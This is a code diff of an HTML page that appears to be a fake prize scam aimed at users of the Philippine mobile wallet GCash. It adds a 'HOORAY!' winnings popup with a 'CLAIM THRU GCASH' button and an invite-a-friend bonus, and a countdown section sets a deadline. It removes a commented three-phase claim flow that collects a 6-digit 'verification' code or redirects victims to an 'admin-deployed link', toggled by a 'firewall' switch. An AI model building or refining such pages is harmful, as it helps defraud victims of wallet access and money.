@@ -102,6 +102,33 @@
             <span class="btn-text">CLAIM NOW!!</span>
         </button>
 
+         <!-- PRIZE POPUP -->
+        <div id="prizePopup" class="prize-popup" style="display: none;">
+            <div class="popup-container">
+                <div class="popup-inner">
+                    <div class="popup-close" id="popupCloseBtn">✕</div>
+                    <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
+                    <div class="prize-amount">₱<span id="popupBalanceAmount">0</span></div>
+                    <div class="divider"></div>
+                    <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱500 bonus</strong>.</div>
+                    <div class="luckyday-image-container">
+                        <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img">
+                    </div>
+                    <div class="divider"></div>
+                    <div class="indicator-group">
+                        <div class="indicator" id="indicator1"></div>
+                        <div class="indicator" id="indicator2"></div>
+                        <div class="indicator" id="indicator3"></div>
+                    </div>
+                    <button class="claim-gcash-button" id="claimGCashBtn">
+                        <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
+                    </button>
+                    <div class="button-separator"></div>
+                    <button class="back-btn" id="backBtn">← BACK</button>
+                </div>
+            </div>
+        </div>
+
         <!-- ========== TIME LEFT SECTION ========== -->
         <div class="time-left-section">
             <div class="time-label">⏰ BONUS ENDS IN ⏰</div>
@@ -199,24 +226,6 @@
             <button class="success-close-btn" id="successCloseBtn">
                 <i class="fas fa-check"></i> GOT IT
             </button>
-        </div>
-    </div>
-
-    <!-- ============================================================
-         3-PHASE CLAIM POPUP (Carnival Theme)
-         ============================================================
-         PHASE 1: HOORAY — balance + bills + CLAIM THRU GCASH
-         PHASE 2: GREAT JOB — confirm + PROCEED TO WITHDRAW
-         PHASE 3: AI-VERIFICATION — 6-digit code (kapag firewall ON)
-
-         FIREWALL OFF → Phase 1 → Phase 2 → REDIRECT sa admin-deployed link
-         FIREWALL ON  → Phase 1 → Phase 2 → Phase 3 (AI-Call) → Submit
-         ============================================================ -->
-    <div id="claimPhasePopup" class="claim-phase-popup" style="display: none;">
-        <div class="claim-phase-container">
-            <div class="claim-phase-inner" id="claimPhaseInner">
-                <!-- Content injected by playbonus.js -->
-            </div>
         </div>
     </div>
 
